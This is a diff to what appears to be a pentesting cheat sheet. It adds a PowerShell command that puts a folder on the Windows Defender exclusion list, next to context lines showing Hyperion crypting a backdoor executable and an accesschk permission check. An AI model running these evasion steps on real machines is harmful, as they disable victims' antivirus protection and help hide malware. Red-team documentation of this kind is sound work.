@@ -429,6 +429,10 @@ accesschk.exe -uwcqv "Authenticated Users" C:\*.* /accepteula
 $ wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe
 
 ```
+* Add a file/folder to Windows Defender exclusion list 
+```
+C:\>powershell -exec bypass - "Add-MpPreference -ExclusionPath 'D:\EvilFolder\Tools'"
+```
 
 [Back](#summary)
 
